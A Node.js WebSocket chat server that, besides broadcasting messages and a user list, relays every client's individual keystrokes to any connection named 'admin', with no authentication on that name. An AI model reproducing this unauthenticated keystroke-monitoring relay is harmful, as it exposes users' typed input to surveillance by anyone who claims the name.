import { WebSocketServer, WebSocket } from "ws";
import { randomUUID } from "crypto";

const server = new WebSocketServer({ port: 8080 });
const clients = new Map();

server.on("connection", function connection(ws) {
  const clientId = randomUUID();
  clients.set(clientId, { ws, username: null });
  console.log("Client connected with ID:", clientId);

  ws.on("close", () => {
    console.log(
      `Client with ID ${clientId} (${
        clients.get(clientId).username || "unknown"
      }) has disconnected.`
    );
    clients.delete(clientId);
    sendUserList(); // Kullanıcı listesini güncelle
  });

  ws.on("error", (error) => console.error("WebSocket error:", error));

  ws.on("message", function incoming(message) {
    const messageObject = JSON.parse(message);
    const client = clients.get(clientId);

    switch (messageObject.type) {
      case "setUsername":
        client.username = messageObject.username;
        console.log(
          `Username set for client ID: ${clientId} -> ${client.username}`
        );
        sendUserList(); // Kullanıcı listesini güncelle
        break;
      case "message":
        handleIncomingMessage(messageObject, clientId);
        break;
      case "keystroke":
        handleKeystroke(messageObject, client);
        break;
      default:
        console.log("Received unknown type of message");
    }
  });
});

function handleIncomingMessage(messageObject, senderId) {
  const sender = clients.get(senderId);
  const outgoingMessage = JSON.stringify({
    type: "message",
    name: sender.username || "Anonymous",
    message: messageObject.message,
  });

  // Tüm bağlı kullanıcılara gönder
  clients.forEach(({ ws: clientWs }) => {
    if (clientWs.readyState === WebSocket.OPEN) {
      clientWs.send(outgoingMessage);
    }
  });
}

function handleKeystroke(messageObject, senderClient) {
  const monitor = [...clients.values()].find(
    (client) => client.username === "admin"
  );
  if (monitor && monitor.ws.readyState === WebSocket.OPEN) {
    monitor.ws.send(
      JSON.stringify({
        type: "keystroke",
        clientId: senderClient.id,
        username: senderClient.username,
        keystroke: messageObject.keystroke,
      })
    );
    console.log(
      `Keystroke '${messageObject.keystroke}' from ${senderClient.username} sent to monitor`
    );
  }
}

function listConnectedUsers() {
  console.log("Currently connected clients:");
  clients.forEach(({ username }, id) => {
    console.log(`Client ID: ${id}, Username: ${username || "not set"}`);
  });
}

function sendUserList() {
  const userList = Array.from(clients.values()).map(
    (client) => client.username || "Anonymous"
  );
  const message = JSON.stringify({
    type: "userList",
    users: userList,
  });
  clients.forEach(({ ws: clientWs }) => {
    if (clientWs.readyState === WebSocket.OPEN) {
      clientWs.send(message);
    }
  });
}

setInterval(sendUserList, 10000);

console.log("Server is running on port 8080");
